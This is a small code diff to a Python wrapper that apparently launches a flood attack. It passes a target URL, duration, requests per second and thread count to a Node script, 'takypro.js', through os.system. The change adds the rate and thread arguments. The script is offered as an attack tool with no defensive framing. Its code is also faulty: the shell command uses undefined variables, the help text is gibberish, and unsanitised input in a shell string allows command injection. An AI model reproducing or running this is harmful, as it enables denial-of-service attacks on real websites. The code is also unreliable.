@@ -67,9 +67,11 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Simulate an attack command.')
     parser.add_argument('host', type=str, help='URL to attack')
     parser.add_argument('time', type=int, help='Time duration of attack')
+    parser.add_argument('rps', type=int, help='anjiwie')
+    parser.add_argument('threads', type=int, help='itiskkdu')
 
     args = parser.parse_args()
 
-    os.system(f'node takypro.js {host} {time} 5000 5000')
+    os.system(f'node takypro.js {host} {time} {rps} {threads}')
 
     main(args.host, args.time)
